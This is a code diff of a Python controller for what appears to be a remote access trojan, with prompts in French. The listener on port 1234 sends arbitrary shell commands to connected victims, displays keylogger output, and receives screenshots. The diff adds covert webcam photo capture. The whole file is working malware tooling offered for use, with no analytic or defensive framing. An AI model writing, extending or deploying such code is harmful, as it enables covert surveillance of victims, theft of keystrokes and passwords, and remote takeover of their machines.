@@ -1,16 +1,12 @@
 import socket
 import threading
 
-ip_address = '0.0.0.0'
-port_number = 1234
-keylog_file = "keylog.txt"
-
 def handle_connection(connection, address):
     print(f"Connexion établie avec {address}")
 
     while True:
         try:
-            command = input("Entrer une commande à exécuter ('exit' pour terminer, 'keylog' pour afficher les frappes) : ")
+            command = input("Entrer une commande à exécuter ('exit' pour terminer, 'keylog' pour afficher les frappes, 'screenshot' ou 'webcam' pour recevoir une photo) : ")
 
             if command.lower() == 'exit':
                 connection.send(b'quit')
@@ -18,15 +14,17 @@ def handle_connection(connection, address):
 
             elif command.lower() == 'keylog':
                 try:
-                    with open(keylog_file, "r") as keylog:
+                    with open("keylog.txt", "r") as keylog:
                         print(f"Contenu du Keylogger :\n{keylog.read()}")
                 except FileNotFoundError:
                     print("Aucun fichier keylog trouvé.")
 
-            elif command.lower() == 'screenshot':
+            elif command.lower() == 'screenshot' or command.lower() == 'webcam':
                 connection.send(command.encode())
+
                 img_size = int(connection.recv(1024).decode())
                 connection.send(b'OK')
+
                 img_data = b''
                 while len(img_data) < img_size:
                     packet = connection.recv(4096)
@@ -34,24 +32,20 @@ def handle_connection(connection, address):
                         break
                     img_data += packet
 
-                with open("screen.png", "wb") as f:
-                    f.write(img_data)
-                print("Capture réussie !")
-                continue
-
-            elif command.startswith("scan"):
-                print("Scan en cours...")
-                response = connection.recv(4096).decode()
-                print(f"Résultat du scan :\n{response}")
-                continue
+                if command.lower() == 'screenshot':
+                    with open("screenshot.png", "wb") as f:
+                        f.write(img_data)
+                    print("Capture d'écran reçue et sauvegardée sous 'screenshot.png'.")
+                else:
+                    with open("webcam.png", "wb") as f:
+                        f.write(img_data)
+                    print("Photo de la webcam reçue et sauvegardée sous 'webcam_image.png'.")
 
             else:
                 connection.send(command.encode())
-
                 response = connection.recv(4096).decode()
                 if not response:
                     break
-
                 print(f"Output:\n{response}")
         except Exception as e:
             print(f"Error: {e}")
@@ -61,9 +55,9 @@ def handle_connection(connection, address):
 
 def start_server():
     ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    ss.bind((ip_address, port_number))
+    ss.bind(('0.0.0.0', 1234))
     ss.listen(5)
-    print(f"Serveur en écoute sur {ip_address}:{port_number}")
+    print(f"Serveur en écoute sur 0.0.0.0:1234")
 
     while True:
         connection, address = ss.accept()
